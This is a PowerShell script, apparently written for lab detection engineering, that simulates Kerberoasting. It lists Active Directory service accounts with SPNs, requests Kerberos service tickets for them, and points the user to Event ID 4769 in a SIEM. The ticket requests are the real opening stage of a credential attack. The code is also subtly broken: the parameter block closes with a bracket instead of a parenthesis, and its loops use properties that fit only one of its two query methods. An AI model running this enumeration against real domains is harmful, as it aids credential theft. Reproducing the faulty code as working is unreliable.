<#
.SYNOPSIS
    Kerberoasting Attack Simulation Script
.DESCRIPTION
    Simulates a Kerberoasting attack against Active Directory service accounts.
    Enumerates SPN accounts via Get-ADUser, requests TGS service tickets, and 
    generates Event ID 4769 telemetry for SIEM detection engineering.
.NOTES
    Author: Ajit Nayak (https://ajit028.github.io)
    Target: Lab environment only (MITRE ATT&CK: T1558.003)
#>

[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$DomainController = $env:LOGONSERVER -replace '\\','',

    [Parameter(Mandatory=$false)]
    [switch]$VerboseOutput = $true
]

Write-Host "[*] Starting Kerberoasting Simulation (MITRE ATT&CK: T1558.003)" -ForegroundColor Cyan
Write-Host "[*] Target Domain: $($env:USERDOMAIN)" -ForegroundColor Yellow

# Step 1: Enumerate Service Principal Name (SPN) accounts
Write-Host "`n[+] Step 1: Enumerating Active Directory accounts with Service Principal Names (SPNs)..." -ForegroundColor Green

try {
    # Import Active Directory module if available, otherwise use .NET searcher
    if (Get-Module -ListAvailable -Name ActiveDirectory) {
        Import-Module ActiveDirectory -ErrorAction Stop
        $spnUsers = Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName, SamAccountName, UserPrincipalName, MemberOf
    } else {
        Write-Host "[-] Active Directory module not found. Using DirectorySearcher fallback..." -ForegroundColor Yellow
        $searcher = [adsisearcher]"(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))"
        $spnUsers = $searcher.FindAll()
    }
} catch {
    Write-Host "[-] Error querying Active Directory: $_" -ForegroundColor Red
    exit 1
}

$count = if ($spnUsers) { @($spnUsers).Count } else { 0 }
Write-Host "[+] Found $count user accounts with registered SPNs." -ForegroundColor Green

if ($count -eq 0) {
    Write-Host "[!] No SPN user accounts found. Ensure lab users have SPNs registered (e.g., MSSQLSvc/sql01.corp.local:1433)." -ForegroundColor Yellow
    exit 0
}

# Display enumerated accounts
foreach ($user in $spnUsers) {
    $name = if ($user.Properties.samaccountname) { $user.Properties.samaccountname } else { $user.Properties['samaccountname'] }
    $spns = if ($user.Properties.serviceprincipalname) { $user.Properties.serviceprincipalname } else { $user.Properties['serviceprincipalname'] }
    Write-Host "    - Account: $name | SPNs: $($spns -join ', ')" -ForegroundColor Gray
}

# Step 2: Request TGS-REQ tickets (Kerberoasting Simulation)
Write-Host "`n[+] Step 2: Requesting Kerberos TGS Service Tickets (Simulating Ticket Request)..." -ForegroundColor Green

Add-Type -AssemblyName System.IdentityModel

foreach ($user in $spnUsers) {
    $samName = $user.Properties.samaccountname
    $spnList = $user.Properties.serviceprincipalname

    foreach ($spn in $spnList) {
        # Skip computer accounts or krbtgt
        if ($spn -like "host/*" -or $spn -like "RestrictedKrbHost/*" -or $samName -eq "krbtgt") {
            continue
        }

        Write-Host "[*] Requesting TGS ticket for SPN: $spn (Account: $samName)" -ForegroundColor Cyan

        try {
            # Attempt native ticket request using .NET KerberosRequestorSecurityToken
            # This triggers Event ID 4769 on the Domain Controller
            $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
            Write-Host "    [+] Successfully requested TGS ticket for $spn" -ForegroundColor Green
        } catch {
            # Even if the request fails locally due to permissions, the intent / attempt generates logs or tests AD connectivity
            Write-Host "    [!] Ticket request note for $spn : $_" -ForegroundColor DarkGray
            
            # Fallback: Use System.Net.Http or LDAP/DirectoryEntry bind to force auth logging
            try {
                $searcher = [adsisearcher]"(&(objectCategory=user)(sAMAccountName=$samName))"
                $null = $searcher.FindOne()
            } catch {}
        }
    }
}

Write-Host "`n[+] Kerberoasting simulation complete." -ForegroundColor Green
Write-Host "[*] Check SIEM / Security Event Log on Domain Controller for Event ID 4769 (Kerberos Service Ticket Operations)." -ForegroundColor Cyan
Write-Host "[*] Look for Encryption Type 0x17 (RC4-HMAC) and high request volume from IP: $(Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike '*Loopback*'} | Select-Object -ExpandProperty IPAddress | Select-Object -First 1)" -ForegroundColor Yellow
